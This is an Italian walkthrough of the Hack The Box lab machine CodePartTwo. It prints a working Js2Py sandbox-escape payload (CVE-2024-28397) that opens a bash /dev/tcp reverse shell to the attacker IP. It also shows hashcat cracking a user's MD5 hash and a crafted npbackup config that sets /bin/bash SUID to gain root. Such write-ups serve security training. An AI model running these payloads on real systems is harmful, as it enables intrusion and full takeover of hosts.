# Macchina CodePartTwo

IP vittima: 10.10.11.82 

IP attacante: 10.10.14.14

## Recon

`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.82 -oG porte`
`nmap -sC -sV -p8000 10.10.11.82 -oN servizi`

## Porte e Servizi

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017205234.png)

## Porta 8000

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017205344.png)

- Scaricare l'app per analizzarla

- Registrarsi con nome utente e password qualsiasi e accedere
  ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017205545.png)
  
  ## Analisi app
  
  Una volta scaricata e unzippata l'app, nella sua cartella si trova il file **requirements.txt**
  ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017210047.png)
  
  ### exploit js2py 0.74 ( CVE-2024-28397 )

- **CVE**: **CVE-2024-28397**.  
    Colpisce **Js2Py ≤ 0.74** e consente **Remote Code Execution** (sandbox escape) anche quando si usa `js2py.disable_pyimport()` per “blindare” l’ambiente. Un attaccante può ottenere un riferimento ad oggetti Python dall’interno del codice JavaScript e arrivare a eseguire comandi (es. via `subprocess.Popen`). [nvd.nist.gov+2GitHub+2](https://nvd.nist.gov/vuln/detail/CVE-2024-28397?utm_source=chatgpt.com)

- **Stato patch**: l’upstream su PyPI è fermo alla **0.74** (nov 2022) e i tracker indicano **nessuna versione ufficiale corretta**; alcune distro hanno backportato fix nei loro pacchetti (aggiornamenti SUSE/Mageia). In pratica: su PyPI non esiste ancora un rilascio “0.75/patchato” del progetto originale. [Linux Security+3PyPI+3GitHub+3](https://pypi.org/project/Js2Py/?utm_source=chatgpt.com)

- **PoC e dettagli tecnici**: il PoC pubblico mostra come bypassare `disable_pyimport()` sfruttando una variabile globale/oggetto interno per risalire a oggetti Python e uscire dal sandbox. Il repository del ricercatore include anche una patch “non ufficiale”/workaround. [GitHub](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape?utm_source=chatgpt.com)

Vedi questa git hub `https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py`

Il payload da sfruttare è questo:

```javascript
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

### Sfruttare il payload

Questo è il payload precedente con inserita la reverse shell sulla porta 4500 ( `bash -c 'exec bash -i &>/dev/tcp/10.10.14.15/4500` )

```javascript
"code":"let cmd = \"bash -c 'exec bash -i &>/dev/tcp/10.10.14.15/4500 <&1'; \"\nlet hacked, bymarve, n11\nlet getattr, obj\n\nhacked = Object.getOwnPropertyNames({})\nbymarve = hacked.__getattribute__\nn11 = bymarve(\"__getattribute__\")\nobj = n11(\"__class__\").__base__\ngetattr = obj.__getattribute__\n\nfunction findpopen(o) {\n    let result;\n    for(let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i]\n        if(item.__module__ == \"subprocess\" && item.__name__ == \"Popen\") {\n            return item\n        }\n        if(item.__name__ != \"type\" && (result = findpopen(item))) {\n            return result\n        }\n    }\n}\n\nn11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()\nconsole.log(n11)\nn11"
```

Mettersi in ascolto sulla porta 4500 `nc -nlvp 4500`
Andare sulla dashboard del sito e lanciare `run code` bloccandolo con la **Burpsuite**
In Burpsuite sostituire il "code" con il payload e fare **farward**
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017212338.png)
Arriva la shell e siamo dentro.
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017212805.png)

### User marco

Esaminiamo **passwd** con `cat /etc/passwd` e troviamo lo user marco
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017213121.png)
Andiamo nella cartella `/tmp/` e scarichiamo [[linpeas]](mettere su un server python nella cartella del nostro PC che lo contiene e scaricarlo nella cartella /tmp/ del computer vittima con wget ).
Una volta scaricato dargli i permessi di esecuzione e lanciarlo.

Linpeas trova dei db che potrebbero contenere informazioni interessanti
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017222826.png)
soprattutto il file `users.db`
Esaminiamolo con `sqlite3`:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017223957.png)
Troviamo due hash md5 (soprattutto quello di marco) che possiamo provare a craccare con[[hashcat]]
`hashcat -m 0 649c9d65a206a75f5abe509fe128bce5 /usr/share/wordlists/rockyou.txt`
Troviamo la password `sweetangelbabylove`
Quindi possiamo usare lo user `marco` e la sua password per connetterci con ssh
Nella cartella `/home/marco` troviamo la userflag nel file `user.txt`

## Scalata dei privilegi

Linpeas aveva trovato anche il file `npbackup-cli` che potrebbe essere sfruttato
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017230659.png)

con `sudo -l` vediamo che l'utente marco può lanciare il file npbackup-cli come sudo senza password:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017232022.png)
Quindi può essere sfruttato per scalare i privilegi.

### Script /usr/local/bin/npbackup-cli

questo è lo script python npbackup-cli

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

Vediamo che lo script importa `main` da `npbackup.__main__` 
Proviamo a cercare `npbackup` per trovare `__main__`
`find / -name "npbackup" -type d 2>/dev/null`
Lo troviamo in `/usr/local/lib/python3.8/dist-packages/npbackup`

Se lanciamo `npbackup-cli` vediamo che per funzionare necessita di un file di configurazione:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017233800.png)
Lanciando l'help di `npbackup-cli` vediamo che può essere lanciato fornendo l'indirizzo del file di configurazione, che potrebbe essere modificato per lanciare dei comandi con i permessi root
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251017234158.png)
Proviamo a cercare un file di configurazione da modificare:
`find / -name "*npbackup*conf*" -type f 2>/dev/null`
Lo troviamo in `/home/marco/npbackup.conf`

### Exploit

copiamo il file di configurazione copiato in /tmp/
`cp /home/marco/npbackup.conf /tmp/exploit.conf`
Modifichiamo la parte iniziale del file `exploit.conf` inserendo i comandi 

```bash
pre_exec_commands:
      - chmod +s /bin/bash
```

in questo modo:

```bash
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: /tmp/repo
    repo_group: default_group
    backup_opts:
      paths:
      - /tmp/backup_source
      source_type: folder_list
      exclude_files_larger_than: 0.0
      pre_exec_commands:
      - chmod +s /bin/bash
    repo_opts:
      repo_password: test123
```

poi lanciamo lo script:
`sudo /usr/local/bin/npbackup-cli -c /tmp/exploit.conf --backup`
e il comando
`/bin/bash -p`
Per diventare root
Nella cartella `/root` troviamo la rootflag nel file `root.txt` 
